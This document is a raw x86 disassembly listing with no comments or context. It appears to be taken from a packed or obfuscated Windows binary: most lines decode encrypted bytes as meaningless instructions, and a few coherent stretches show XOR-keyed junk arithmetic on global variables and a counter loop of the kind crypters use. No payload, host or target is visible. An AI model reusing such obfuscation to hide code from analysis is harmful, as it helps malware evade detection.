  40a371:	xor    ebp,esp
  40a373:	fsubr  DWORD PTR [esi+0xb9de4af]
  40a379:	(bad)  
  40a37a:	jmp    0x40a3dc
  40a37c:	sub    al,BYTE PTR [ebx+0x0]
  40a37f:	jge    0x40a3ef
  40a381:	mov    ah,0x58
  40a383:	mov    WORD PTR [edx+0x7f],?
  40a386:	xchg   ebx,eax
  40a387:	xor    eax,0xb154f5b
  40a38c:	and    ecx,eax
  40a38e:	xor    eax,0x99e73fe0
  40a393:	mov    cl,0xa9
  40a395:	test   al,0x23
  40a397:	mov    dh,0xe0
  40a399:	shl    al,1
  40a39b:	inc    eax
  40a39c:	xchg   esi,edx
  40a39e:	inc    ebp
  40a39f:	mov    ds:0xb4debc32,al
  40a3a4:	lea    esp,[eax-0x2]
  40a3a7:	push   ebp
  40a3a8:	test   al,0xbd
  40a3aa:	pop    edx
  40a3ab:	ds mov al,0xa3
  40a3ae:	sbb    edx,DWORD PTR [edx]
  40a3b0:	sbb    edi,edx
  40a3b2:	aas    
  40a3b3:	iret   
  40a3b4:	loop   0x40a3ca
  40a3b6:	cli    
  40a3b7:	icebp  
  40a3b8:	add    DWORD PTR [edx+0x2f6a38d],0xe8b3bf5e
  40a3c2:	inc    esi
  40a3c3:	daa    
  40a3c4:	add    ch,BYTE PTR [ebx+0x392c9313]
  40a3ca:	fistp  DWORD PTR [esp+eax*8-0x5c]
  40a3ce:	xchg   esp,eax
  40a3cf:	lods   al,BYTE PTR ds:[esi]
  40a3d0:	int3   
  40a3d1:	jo     0x40a3c5
  40a3d3:	inc    ebp
  40a3d4:	sub    esp,esi
  40a3d6:	mov    cl,0x46
  40a3d8:	loopne 0x40a3aa
  40a3da:	mov    ds:0x21111220,al
  40a3df:	pushf  
  40a3e0:	fnstsw WORD PTR [eax-0x685644f1]
  40a3e6:	push   edi
  40a3e7:	shl    esp,1
  40a3e9:	push   ds
  40a3ea:	jmp    0x40a40b
  40a3ec:	shl    ch,cl
  40a3ee:	or     dh,BYTE PTR [edx]
  40a3f0:	xor    eax,0xcbcdf39d
  40a3f5:	lock sbb al,0x3f
  40a3f8:	sub    al,0x68
  40a3fa:	adc    DWORD PTR [edx-0x230074f4],ebp
  40a400:	xchg   bl,ch
  40a402:	out    dx,al
  40a403:	or     al,0x8b
  40a405:	das    
  40a406:	mov    eax,DWORD PTR [ecx+ecx*1-0x2b]
  40a40a:	retf   0xb4b
  40a40d:	mov    edx,DWORD PTR [ebp-0x4]
  40a410:	xor    edx,eax
  40a412:	adc    DWORD PTR ds:0x4335f3,0x43361f
  40a41c:	add    edx,ecx
  40a41e:	mov    DWORD PTR ds:0x43362b,0x68c0
  40a428:	cmp    edi,edx
  40a42a:	jb     0x40d767
  40a430:	mov    edx,DWORD PTR [ebp-0x28]
  40a433:	mov    edi,DWORD PTR [ebp-0x4]
  40a436:	xor    edx,eax
  40a438:	xor    ebx,ebx
  40a43a:	add    ebx,DWORD PTR ds:0x433563
  40a440:	and    DWORD PTR ds:0x43365f,ebx
  40a446:	xor    edi,eax
  40a448:	movzx  ebx,WORD PTR ds:0x433657
  40a44f:	sbb    DWORD PTR ds:0x433567,ebx
  40a455:	add    edi,ecx
  40a457:	add    DWORD PTR ds:0x4335f3,0x6da
  40a461:	add    edx,ecx
  40a463:	and    DWORD PTR ds:0x4335a7,0x0
  40a46d:	jmp    0x40a47f
  40a472:	mov    ebx,DWORD PTR ds:0x4335a7
  40a478:	inc    ebx
  40a479:	mov    DWORD PTR ds:0x4335a7,ebx
  40a47f:	cmp    DWORD PTR ds:0x4335a7,0x1c
  40a486:	jae    0x40a823
  40a48c:	cmp    DWORD PTR ds:0x4335a7,0x1e
  40a493:	jne    0x40a4a1
  40a499:	push   0x1
  40a49b:	call   DWORD PTR ds:0x412270
  40a4a1:	jmp    0x40a472
  40a4a6:	sbb    DWORD PTR ds:0x43366f,0x1f9a
  40a4b0:	jmp    0x40a823
  40a4b5:	shl    BYTE PTR [edi-0x482074c],cl
  40a4bb:	bnd jno 0x40a491
  40a4be:	lahf   
  40a4bf:	inc    edi
  40a4c0:	sbb    edx,DWORD PTR [eax+0x61]
  40a4c3:	push   0x7cf7895b
  40a4c8:	jl     0x40a494
  40a4ca:	jns    0x40a548
  40a4cc:	jl     0x40a537
  40a4ce:	fisub  DWORD PTR [esi+0x5f3ff07c]
  40a4d4:	mov    cs,WORD PTR ds:0x1a66de30
  40a4da:	dec    edi
  40a4db:	add    eax,0x470c3f84
  40a4e0:	stc    
  40a4e1:	xor    al,0x1
  40a4e3:	not    BYTE PTR [esi]
  40a4e5:	cld    
  40a4e6:	fidivr WORD PTR [edi+ecx*4+0x3a8c0647]
  40a4ed:	push   eax
  40a4ee:	jo     0x40a471
  40a4f0:	out    0xd4,eax
  40a4f2:	jle    0x40a47a
  40a4f4:	xchg   edx,eax
  40a4f5:	fwait
  40a4f6:	push   ecx
  40a4f7:	mul    BYTE PTR [esi+0x234d0c9b]
  40a4fd:	add    al,0xa8
  40a4ff:	xchg   edx,eax
  40a500:	test   eax,0xdba6394c
  40a505:	into   
  40a506:	out    dx,al
  40a507:	(bad)  
  40a508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a509:	pop    edx
  40a50a:	xor    DWORD PTR [ecx-0x6f],esi
  40a50d:	js     0x40a550
  40a50f:	aam    0x37
  40a511:	dec    ecx
  40a513:	sbb    al,BYTE PTR [edi+eax*2-0x2de43fbe]
  40a51a:	adc    dl,BYTE PTR [edx]
  40a51c:	add    eax,0xd5d1d052
  40a521:	lods   al,BYTE PTR ds:[esi]
  40a522:	pop    es
  40a523:	mov    cs,WORD PTR [ebx+edx*2-0x65]
  40a527:	xor    esi,DWORD PTR [edx+0x6fb1b977]
  40a52d:	push   ebp
  40a52e:	pop    ecx
  40a52f:	sbb    BYTE PTR [esi+0x3509db9],bh
  40a535:	mov    dl,0x3d
  40a537:	dec    esp
  40a538:	sub    eax,0xd48dfe63
  40a53d:	sub    al,0xcc
  40a53f:	jmp    0x6ff8839c
  40a544:	outs   dx,BYTE PTR ds:[esi]
  40a545:	adc    ah,BYTE PTR [eax-0xd]
  40a548:	pop    ecx
  40a549:	sahf   
  40a54a:	xor    edx,DWORD PTR [edx-0x15dd6647]
  40a550:	ret    
  40a551:	pop    esi
  40a552:	pop    eax
  40a553:	cmc    
  40a554:	adc    eax,0x9a0da3f7
  40a559:	mov    ch,0x55
  40a55b:	mov    ds:0x4012171f,eax
  40a560:	into   
  40a561:	or     bh,dh
  40a563:	scas   al,BYTE PTR es:[edi]
  40a564:	rcl    BYTE PTR [ebp-0x50035d01],1
  40a56a:	shr    DWORD PTR [esp+edi*8-0x26b9ab27],cl
  40a571:	das    
  40a572:	out    dx,eax
  40a573:	out    0x17,eax
  40a575:	mov    WORD PTR [ebp-0x64bb17dd],?
  40a57b:	push   esi
  40a57c:	mov    ebp,0x5a1b5c6c
  40a581:	ins    DWORD PTR es:[edi],dx
  40a582:	xor    eax,0xaed8cd84
  40a587:	xchg   esp,eax
  40a588:	dec    eax
  40a589:	xor    DWORD PTR [edx+esi*2],edx
  40a58c:	call   0x2d59c9a8
  40a591:	xchg   ecx,eax
  40a592:	je     0x40a527
  40a594:	into   
  40a595:	dec    ebp
  40a596:	xchg   ebp,eax
  40a597:	and    dh,BYTE PTR [eax+0x53]
  40a59a:	out    dx,al
  40a59b:	jge    0x40a5a2
  40a59d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a59e:	cmp    eax,0x42d183f9
  40a5a3:	or     al,0x63
  40a5a5:	inc    DWORD PTR [ebx+0x33]
  40a5a8:	imul   ebp,esp,0xffffff8d
  40a5ab:	sbb    ecx,ecx
  40a5ad:	xor    al,0x92
  40a5af:	out    0x54,eax
  40a5b1:	dec    edx
  40a5b2:	xchg   DWORD PTR [ebx+0xe],eax
  40a5b5:	aad    0xe2
  40a5b7:	ror    DWORD PTR [ebp+0x6],1
  40a5ba:	xchg   DWORD PTR [eax],edi
  40a5bc:	pcmpgtw mm0,mm3
  40a5bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5c0:	add    eax,0xe5ebe77e
  40a5c5:	and    cl,al
  40a5c7:	in     al,0x42
  40a5c9:	push   es
  40a5ca:	pop    ss
  40a5cb:	xor    DWORD PTR [ecx+0x3a424ec6],ebp
  40a5d1:	fnstsw WORD PTR [eax]
  40a5d3:	ja     0x40a5b0
  40a5d5:	js     0x40a608
  40a5d7:	inc    ebx
  40a5d8:	jle    0x40a5d0
  40a5da:	jbe    0x40a5b1
  40a5dc:	xchg   ebx,eax
  40a5dd:	adc    eax,0x31ac5e36
  40a5e2:	sbb    BYTE PTR [eax],al
  40a5e4:	outs   dx,BYTE PTR ds:[esi]
  40a5e5:	jmp    0xdb637db6
  40a5ea:	pop    ds
  40a5eb:	and    BYTE PTR [esp+esi*1-0x4e],ah
  40a5ef:	test   BYTE PTR [edx],bh
  40a5f1:	pop    esp
  40a5f2:	outs   dx,DWORD PTR ds:[esi]
  40a5f3:	fstp   QWORD PTR ds:0xf57274fd
  40a5f9:	in     eax,dx
  40a5fa:	retf   
  40a5fb:	imul   eax,DWORD PTR [edi+0x6],0x611b482d
  40a602:	popa   
  40a603:	push   eax
  40a604:	in     eax,dx
  40a605:	push   ecx
  40a606:	aam    0x6d
  40a608:	pop    esi
  40a609:	(bad)  
  40a60a:	jno    0x40a663
  40a60c:	mov    edx,0xd858f622
  40a611:	loopne 0x40a64c
  40a613:	xlat   BYTE PTR ds:[ebx]
  40a614:	and    edx,DWORD PTR [esi+0x3d]
  40a617:	leave  
  40a618:	cdq    
  40a619:	mov    ds:0xe759ff7d,al
  40a61e:	cmp    bl,BYTE PTR [ecx+edx*4-0x7e8d93c8]
  40a625:	inc    edx
  40a626:	cmp    BYTE PTR [esi+0xa18a6d7],cl
  40a62c:	inc    edx
  40a62d:	jo     0x40a5fd
  40a62f:	dec    ebp
  40a630:	std    
  40a631:	cmp    edi,DWORD PTR [esi+0x6b]
  40a634:	xor    BYTE PTR [esi],ah
  40a636:	xor    cl,BYTE PTR [ecx]
  40a638:	cmp    eax,0x69fb7132
  40a63d:	(bad)  
  40a63e:	cmp    al,0x26
  40a640:	xchg   ebp,eax
  40a641:	inc    edx
  40a642:	retf   
  40a643:	push   es
  40a644:	xchg   edx,eax
  40a645:	mov    ds:0x361570ce,eax
  40a64a:	ret    0x1fc4
  40a64d:	dec    dx
  40a64f:	pop    ecx
  40a650:	pop    ds
  40a651:	mov    WORD PTR [eax+eiz*1],cs
  40a654:	icebp  
  40a655:	ins    BYTE PTR es:[edi],dx
  40a656:	loop   0x40a610
  40a658:	int    0x82
  40a65a:	push   es
  40a65b:	fiadd  DWORD PTR [edi+0x187a6cfe]
  40a661:	nop
  40a662:	dec    eax
  40a663:	std    
  40a664:	aas    
  40a665:	sbb    eax,0x7611ee8b
  40a66a:	les    eax,FWORD PTR [edx]
  40a66c:	mov    al,ds:0xf5fb145d
  40a671:	add    al,BYTE PTR [edi-0x2ae2b476]
  40a677:	(bad)  
  40a678:	pop    esp
  40a679:	aaa    
  40a67a:	das    
  40a67b:	das    
  40a67c:	popf   
  40a67d:	sbb    ebx,eax
  40a67f:	ret    0xaff1
  40a682:	cmp    ebx,DWORD PTR [ebp+edi*8-0x6919286d]
  40a689:	adc    al,0xf5
  40a68b:	test   eax,0x7145e78f
  40a690:	push   edx
  40a691:	nop
  40a692:	leave  
  40a693:	jo     0x40a67b
  40a695:	push   cs
  40a696:	in     al,dx
  40a697:	aas    
  40a698:	fdiv   DWORD PTR [ecx+ecx*4-0x78]
  40a69c:	neg    bl
  40a69e:	pusha  
  40a69f:	shr    DWORD PTR [edx+edx*2+0xeb70daa],cl
  40a6a6:	js     0x40a63d
  40a6a8:	and    BYTE PTR [eax+0x2f],ah
  40a6ab:	mov    DWORD PTR [ebx-0x1ed468f8],edi
  40a6b1:	je     0x40a6e6
  40a6b3:	push   esi
  40a6b4:	jb     0x40a730
  40a6b6:	in     al,dx
  40a6b7:	add    al,0xbf
  40a6b9:	addr16 add al,0xf1
  40a6bc:	sub    edi,edi
  40a6be:	in     eax,0x2b
  40a6c0:	dec    eax
  40a6c1:	push   eax
  40a6c2:	sub    al,0x5d
  40a6c4:	xchg   BYTE PTR [ecx+0x5f],bl
  40a6c7:	fsubr  QWORD PTR [esp+ebp*8-0x1e]
  40a6cb:	jge    0x40a69a
  40a6cd:	mov    eax,ds:0x68e9e561
  40a6d2:	pusha  
  40a6d3:	gs pop esi
  40a6d5:	mov    ecx,0x7d736e55
  40a6da:	ja     0x40a6c4
  40a6dc:	mov    cl,0x2f
  40a6de:	push   0x7d
  40a6e0:	or     ebx,DWORD PTR ss:[ecx]
  40a6e3:	addr16 mov cl,0x16
  40a6e6:	inc    esp
  40a6e7:	ror    ah,cl
  40a6e9:	jecxz  0x40a6a2
  40a6eb:	pop    edi
  40a6ec:	aad    0x2d
  40a6ee:	push   cs
  40a6ef:	cmp    eax,0x85508717
  40a6f4:	mov    ch,0xbe
  40a6f6:	dec    ebp
  40a6f7:	pop    edx
  40a6f8:	inc    edx
  40a6f9:	xchg   ecx,eax
  40a6fa:	push   ds
  40a6fb:	adc    BYTE PTR [eax-0x51367bf2],dl
  40a701:	push   cs
  40a702:	xchg   edi,ebp
  40a704:	and    DWORD PTR [esi],0xffffffb3
  40a707:	not    DWORD PTR [ebp+0x55c2f77e]
  40a70d:	pop    ebx
  40a70e:	repnz adc eax,0xe4642849
  40a714:	xor    eax,0x65c6eabb
  40a719:	xor    al,0xcf
  40a71b:	xor    ah,dl
  40a71d:	aas    
  40a71e:	mov    cl,BYTE PTR [esi+eiz*1]
  40a721:	mov    ch,BYTE PTR [esi]
  40a723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a724:	sbb    BYTE PTR [ebx],0x4c
  40a727:	sar    DWORD PTR [ebp-0x52bd6b42],cl
  40a72d:	shr    DWORD PTR [eax-0x39c8be0],1
  40a733:	leave  
  40a734:	mov    al,ds:0xfe41b5b3
  40a739:	stos   BYTE PTR es:[edi],al
  40a73a:	push   ss
  40a73b:	push   cs
  40a73c:	pop    esp
  40a73d:	popf   
  40a73e:	jns    0x40a706
  40a740:	shl    al,0x76
  40a743:	stc    
  40a744:	push   cs
  40a745:	scas   eax,DWORD PTR es:[edi]
  40a746:	or     BYTE PTR [edi-0x5b],dl
  40a749:	sub    BYTE PTR [esi-0x3230cb1b],0xb2
  40a750:	mov    ebx,0x759b6653
  40a755:	hlt    
  40a756:	outs   dx,DWORD PTR ds:[esi]
  40a757:	xor    al,0x5
  40a759:	dec    ebp
  40a75a:	mov    edi,eax
  40a75c:	mov    al,ds:0xedf1cf58
  40a761:	jmp    0x40a718
  40a763:	call   0x19e4:0x41f25982
  40a76a:	lods   eax,DWORD PTR ds:[esi]
  40a76b:	lock jmp 0x9970:0x2f4593f9
  40a773:	xor    al,0xb9
  40a775:	jmp    0x729f:0x675bb503
  40a77c:	cld    
  40a77d:	push   esi
  40a77e:	scas   al,BYTE PTR es:[edi]
  40a77f:	cmp    al,0x27
  40a781:	sub    eax,0xb386d24
  40a786:	das    
  40a787:	xchg   edi,eax
  40a788:	imul   ebp,DWORD PTR [ebx],0x30
  40a78b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a78c:	ins    BYTE PTR es:[edi],dx
  40a78d:	enter  0xa318,0x44
  40a791:	mov    al,0x89
  40a793:	fstp   st(3)
  40a795:	mov    eax,0x4ed43485
  40a79a:	aas    
  40a79b:	aas    
  40a79c:	inc    eax
  40a79d:	adc    al,0xf7
  40a79f:	jns    0x40a81d
  40a7a1:	fs xor eax,0x79c9db29
  40a7a7:	ja     0x40a7e4
  40a7a9:	inc    ebp
  40a7aa:	cdq    
  40a7ab:	or     al,0xcf
  40a7ad:	jne    0x40a73c
  40a7af:	sbb    esi,DWORD PTR [eax-0x4977a063]
  40a7b5:	cdq    
  40a7b6:	fucomp st(4)
  40a7b8:	push   edx
  40a7b9:	push   ds
  40a7ba:	(bad)  
  40a7bb:	stc    
  40a7bc:	stos   DWORD PTR es:[edi],eax
  40a7bd:	repnz push edi
  40a7bf:	in     al,0x59
  40a7c1:	inc    edi
  40a7c2:	mov    dh,0x35
  40a7c4:	daa    
  40a7c5:	addr16 inc ebp
  40a7c7:	int    0x77
  40a7c9:	mov    bh,0x6
  40a7cb:	lock loopne 0x40a814
  40a7ce:	ja     0x40a833
  40a7d0:	cdq    
  40a7d1:	or     ebp,DWORD PTR [edx+0x1fe12ca6]
  40a7d7:	sar    DWORD PTR [edx+edx*4+0x18],0x87
  40a7dc:	cmp    eax,DWORD PTR [ebx]
  40a7de:	jp     0x40a767
  40a7e0:	xor    DWORD PTR [ecx-0x707f50d6],ebp
  40a7e6:	outs   dx,BYTE PTR ds:[esi]
  40a7e7:	mov    bl,BYTE PTR [ecx-0x11]
  40a7ea:	sub    eax,0x34f89fe9
  40a7ef:	clc    
  40a7f0:	xor    BYTE PTR [ecx],dl
  40a7f2:	xor    al,0x35
  40a7f4:	xor    bh,BYTE PTR [ebx+0x6f908fd2]
  40a7fa:	mov    ?,eax
  40a7fc:	aam    0x8c
  40a7fe:	sub    DWORD PTR ds:0x4c0a9d5d,edx
  40a804:	gs ret 0xaa4b
  40a808:	ins    BYTE PTR es:[edi],dx
  40a809:	dec    ebx
  40a80a:	les    esi,FWORD PTR [edx+edi*1-0x2a]
  40a80e:	cmp    cl,BYTE PTR [edx]
  40a810:	add    eax,0x3934e368
  40a815:	daa    
  40a816:	or     BYTE PTR [edi+esi*4-0x894554b],ch
  40a81d:	add    al,0x37
  40a81f:	inc    ebx
  40a820:	xchg   dl,ch
  40a822:	in     eax,dx
  40a823:	imul   edx,edi
  40a826:	adc    DWORD PTR ds:0x4335af,ebx
  40a82c:	mov    edi,DWORD PTR [ebp-0x8]
  40a82f:	or     DWORD PTR ds:0x4335ab,ecx
  40a835:	mov    ebx,DWORD PTR [ebp-0x10]
  40a838:	sub    ebx,edi
  40a83a:	cmp    ebx,edx
  40a83c:	mov    DWORD PTR ds:0x4335ef,0x652d
  40a846:	ja     0x40a872
  40a84c:	xor    edx,DWORD PTR ds:0x433597
  40a852:	mov    edx,DWORD PTR [ebp-0x4]
  40a855:	sbb    DWORD PTR ds:0x4335df,0x855
  40a85f:	xor    edx,eax
  40a861:	add    edx,ecx
  40a863:	mov    DWORD PTR ds:0x4335af,0x65c5
  40a86d:	jmp    0x40bab5
  40a872:	mov    ebx,DWORD PTR ds:0x433623
  40a878:	sub    ebx,DWORD PTR ds:0x43354f
  40a87e:	mov    DWORD PTR ds:0x433623,ebx
  40a884:	mov    edx,DWORD PTR [ebp-0x2c]
  40a887:	mov    edi,DWORD PTR [ebp-0x4]
  40a88a:	or     DWORD PTR ds:0x433597,ebx
  40a890:	xor    edx,eax
  40a892:	xor    edi,eax
  40a894:	movzx  ebx,BYTE PTR ds:0x433617
  40a89b:	adc    DWORD PTR ds:0x433553,ebx
  40a8a1:	add    edi,ecx
  40a8a3:	add    edx,ecx
  40a8a5:	imul   edx,edi
  40a8a8:	adc    DWORD PTR ds:0x4335a7,edi
  40a8ae:	mov    edi,DWORD PTR [ebp-0x8]
  40a8b1:	mov    ebx,DWORD PTR [ebp-0x10]
  40a8b4:	sub    ebx,edi
  40a8b6:	cmp    ebx,edx
  40a8b8:	ja     0x40a8c6
  40a8be:	mov    edx,DWORD PTR [ebp-0x28]
  40a8c1:	jmp    0x40baa7
  40a8c6:	mov    edx,DWORD PTR [ebp-0x30]
  40a8c9:	mov    edi,DWORD PTR [ebp-0x4]
  40a8cc:	xor    edx,eax
  40a8ce:	xor    edi,eax
  40a8d0:	jmp    0x40ac43
  40a8d5:	call   0x73960c99
  40a8da:	jge    0x40a8ce
  40a8dc:	pop    ecx
  40a8dd:	jno    0x40a8ff
  40a8df:	aad    0xd1
  40a8e1:	cld    
  40a8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8e3:	mov    DWORD PTR [edx],esi
  40a8e5:	addr16 lock jl 0x40a965
  40a8e9:	retf   0x7c79
  40a8ec:	jl     0x40a925
  40a8ee:	or     al,0x30
  40a8f0:	fwait
  40a8f1:	call   0x17fcba81
  40a8f6:	ins    BYTE PTR es:[edi],dx
  40a8f7:	aad    0x12
  40a8f9:	addr16 int 0x7c
  40a8fc:	jb     0x40a8d1
  40a8fe:	out    dx,eax
  40a8ff:	xchg   ebx,eax
  40a900:	ss xchg ecx,eax
  40a902:	xor    eax,0x6f886ea0
  40a907:	in     al,dx
  40a908:	int3   
  40a909:	gs and edx,eax
  40a90c:	jns    0x40a8cb
  40a90e:	cmc    
  40a90f:	adc    al,0x22
  40a911:	je     0x40a924
  40a913:	adc    al,0xed
  40a915:	jl     0x40a943
  40a917:	adc    dh,BYTE PTR [esi-0x26]
  40a91a:	out    dx,eax
  40a91b:	ret    
  40a91c:	rcl    BYTE PTR [edi-0x50],1
  40a91f:	inc    ebx
  40a920:	jae    0x40a8e5
  40a922:	sbb    esi,DWORD PTR [edx-0x768ab785]
  40a928:	mov    cs,WORD PTR [ebx]
  40a92a:	popa   
  40a92b:	or     BYTE PTR [edx+0x26],ah
  40a92e:	pop    edx
  40a92f:	adc    ebx,0x102f1530
  40a935:	test   al,0xd4
  40a937:	daa    
  40a938:	mov    esi,0x649f6798
  40a93d:	xor    bl,bl
  40a93f:	(bad)  
  40a940:	fisttp DWORD PTR [esp+ebx*8-0x16]
  40a944:	adc    BYTE PTR [edx-0x5d9c00ca],ch
  40a94a:	popa   
  40a94b:	push   bx
  40a94d:	pop    ss
  40a94e:	cmp    ecx,DWORD PTR ds:0x3ca8d7d3
  40a954:	data16 fcomp QWORD PTR [ebx-0x59]
  40a958:	mov    ebx,0x2655bf04
  40a95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a95e:	mov    esp,0xe6262d2e
  40a963:	std    
  40a964:	inc    esp
  40a965:	test   DWORD PTR [esi-0x23cb0dbf],eax
  40a96b:	daa    
  40a96c:	ror    bh,cl
  40a96e:	xor    eax,0x408476dd
  40a973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a974:	push   ecx
  40a975:	adc    al,al
  40a977:	xchg   ecx,eax
  40a978:	dec    esp
  40a979:	iret   
  40a97a:	push   cs
  40a97b:	mov    esp,0x8177445e
  40a980:	test   eax,0x60d16b04
  40a985:	sub    al,0x73
  40a987:	ja     0x40a97a
  40a989:	sub    al,BYTE PTR [ebx]
  40a98b:	out    0x47,eax
  40a98d:	mov    edx,0xc7a7550c
  40a992:	icebp  
  40a993:	sbb    al,0xae
  40a995:	sahf   
  40a996:	sbb    ah,BYTE PTR ds:0x336f77b1
  40a99c:	xchg   edx,eax
  40a99d:	sbb    eax,0xeef3315
  40a9a2:	aas    
  40a9a3:	mov    eax,ds:0xe5e0b735
  40a9a8:	adc    eax,ebx
  40a9aa:	lods   eax,DWORD PTR ds:[esi]
  40a9ab:	push   esi
  40a9ac:	or     eax,0x9c07be00
  40a9b1:	(bad)  
  40a9b2:	mov    esi,0xc07be42d
  40a9b7:	push   edi
  40a9b8:	or     eax,0xc2e1aedf
  40a9bd:	aas    
  40a9be:	jnp    0x40a940
  40a9c0:	pusha  
  40a9c1:	call   0x34d0:0x21c1ec77
  40a9c8:	dec    ebp
  40a9c9:	sbb    al,0xcc
  40a9cb:	call   0x694c:0x4eaa0078
  40a9d2:	xlat   BYTE PTR ds:[ebx]
  40a9d3:	sbb    dl,BYTE PTR ss:[esi]
  40a9d6:	mov    edi,0xbbb6bdcd
  40a9db:	jno    0x40aa07
  40a9dd:	jg     0x40a9d9
  40a9df:	cdq    
  40a9e0:	fsubr  QWORD PTR [eax+0x27]
  40a9e3:	and    al,0x37
  40a9e5:	nop
  40a9e6:	ror    BYTE PTR [esp+eax*1+0x36],1
  40a9ea:	cmp    esi,esi
  40a9ec:	cld    
  40a9ed:	into   
  40a9ee:	gs fwait
  40a9f0:	sub    DWORD PTR [eax],eax
  40a9f2:	mov    eax,ds:0xa154a61f
  40a9f7:	lods   al,BYTE PTR ds:[esi]
  40a9f8:	stos   DWORD PTR es:[edi],eax
  40a9f9:	mov    esp,0x65fd74e0
  40a9fe:	sti    
  40a9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa00:	mov    al,0xe8
  40aa02:	fwait
  40aa03:	leave  
  40aa04:	inc    ebp
  40aa05:	add    edx,DWORD PTR [eax-0x32d7485e]
  40aa0b:	pushf  
  40aa0c:	scas   eax,DWORD PTR es:[edi]
  40aa0d:	inc    DWORD PTR [eax]
  40aa0f:	shl    DWORD PTR [ebx],cl
  40aa11:	push   ebx
  40aa12:	jge    0x40aa13
  40aa14:	xchg   esi,eax
  40aa15:	push   esp
  40aa16:	outs   dx,BYTE PTR ds:[esi]
  40aa17:	sbb    al,0x1b
  40aa19:	adc    DWORD PTR [edi],edx
  40aa1b:	ja     0x40a9bc
  40aa1d:	mov    eax,0x80277a79
  40aa22:	imul   esi,DWORD PTR [ebx+0x3dec1c48],0x58
  40aa29:	sti    
  40aa2a:	sahf   
  40aa2b:	fwait
  40aa2c:	sbb    eax,0x7176a73f
  40aa31:	ret    
  40aa32:	xchg   ebx,eax
  40aa33:	scas   al,BYTE PTR es:[edi]
  40aa34:	hlt    
  40aa35:	fisttp WORD PTR [edi+0xd]
  40aa38:	jmp    0xd5c:0x3dc4b09
  40aa3f:	in     al,0x8a
  40aa41:	sub    esi,DWORD PTR [ebp-0x1f]
  40aa44:	xchg   esi,eax
  40aa45:	push   0x5a
  40aa47:	mov    edx,0x17142af1
  40aa4c:	push   0x9e6a6b02
  40aa51:	adc    ecx,DWORD PTR [edi+0x17a0585f]
  40aa57:	add    edx,ebx
  40aa59:	and    dl,ch
  40aa5b:	aas    
  40aa5c:	jns    0x40aad9
  40aa5e:	push   ecx
  40aa5f:	je     0x40a9ec
  40aa61:	aad    0xe9
  40aa63:	pop    eax
  40aa64:	repz or BYTE PTR [eax+0x64],ch
  40aa68:	xchg   esp,eax
  40aa69:	push   ss
  40aa6a:	mov    DWORD PTR [edi-0x42309c53],eax
  40aa70:	xor    edi,eax
  40aa72:	jle    0x40aad8
  40aa74:	aaa    
  40aa75:	inc    esp
  40aa76:	sub    esi,DWORD PTR [ebp+0x6b]
  40aa79:	cmp    eax,0x91bf6378
  40aa7e:	nop
  40aa7f:	mov    eax,0xd34599e5
  40aa84:	pop    es
  40aa85:	out    0xc0,eax
  40aa87:	inc    ebx
  40aa88:	imul   esp,DWORD PTR [edx],0x7c
  40aa8b:	dec    esi
  40aa8c:	shl    DWORD PTR [ebx+0x25de2c36],cl
  40aa92:	and    DWORD PTR [ecx-0x68],edx
  40aa95:	cli    
  40aa96:	sahf   
  40aa97:	fisttp DWORD PTR [ebx]
  40aa99:	mov    bl,0x69
  40aa9b:	cs cmp ch,bh
  40aa9e:	and    DWORD PTR [esi-0x10e43111],ecx
  40aaa4:	call   0x60a5:0x4d4adc4a
  40aaab:	jnp    0x40aaad
  40aaad:	(bad)  
  40aaae:	mov    ds:0x684cbfbe,eax
  40aab3:	cld    
  40aab4:	xor    bh,BYTE PTR [ecx]
  40aab6:	push   ecx
  40aab7:	dec    edx
  40aab8:	aam    0xac
  40aaba:	inc    ebx
  40aabb:	iret   
  40aabc:	push   0x2e5cfea4
  40aac1:	inc    eax
  40aac2:	fisubr DWORD PTR [edx]
  40aac4:	pop    ds
  40aac5:	sbb    al,BYTE PTR [ebp+0x4e6c4518]
  40aacb:	dec    esp
  40aacc:	mov    eax,ds:0xdafe2cbe
  40aad1:	aam    0x8c
  40aad3:	pop    ss
  40aad4:	pusha  
  40aad5:	pop    esi
  40aad6:	adc    BYTE PTR [ecx],dl
  40aad8:	mov    edx,0x8ec8e2b1
  40aadd:	int    0xeb
  40aadf:	xor    DWORD PTR [ecx-0x80],edi
  40aae2:	dec    edi
  40aae3:	imul   esi,DWORD PTR [edx-0x54dd3092],0x4f09fa61
  40aaed:	outs   dx,DWORD PTR ds:[esi]
  40aaee:	sub    BYTE PTR [eax-0x65928a0e],cl
  40aaf4:	mov    al,ds:0xc09fe17f
  40aaf9:	mov    ds:0x7860f23b,al
  40aafe:	push   edx
  40aaff:	mov    DWORD PTR [edi],esi
  40ab01:	mov    esi,esp
  40ab03:	inc    esi
  40ab04:	push   eax
  40ab05:	xlat   BYTE PTR ds:[ebx]
  40ab06:	cmp    al,0xc9
  40ab08:	imul   ebx,DWORD PTR [edi-0x30],0x66
  40ab0c:	cmp    DWORD PTR [ebp-0x48],ecx
  40ab0f:	adc    ebp,DWORD PTR [ecx+0x38]
  40ab12:	aad    0xff
  40ab14:	jae    0x40aabf
  40ab16:	icebp  
  40ab17:	add    eax,0x28b3bc0e
  40ab1c:	mov    al,ds:0x7d123af0
  40ab21:	cdq    
  40ab22:	and    DWORD PTR [eax+0x45],ebp
  40ab25:	xor    DWORD PTR [edx],0x72
  40ab28:	or     ebx,DWORD PTR [ebx+0x1a]
  40ab2b:	jne    0x40aaaf
  40ab2d:	xchg   edx,eax
  40ab2e:	scas   al,BYTE PTR es:[edi]
  40ab2f:	mov    bh,0xf8
  40ab31:	lea    ebx,[edi]
  40ab33:	jne    0x40ab1a
  40ab35:	mov    ah,ch
  40ab37:	ins    BYTE PTR es:[edi],dx
  40ab38:	cmc    
  40ab39:	cmp    esp,DWORD PTR [ecx+0x46]
  40ab3c:	dec    ecx
  40ab3d:	xlat   BYTE PTR ds:[ebx]
  40ab3e:	jle    0x40ab4f
  40ab40:	retf   
  40ab41:	pushf  
  40ab42:	adc    bl,BYTE PTR [eax]
  40ab44:	fs dec ecx
  40ab46:	inc    ecx
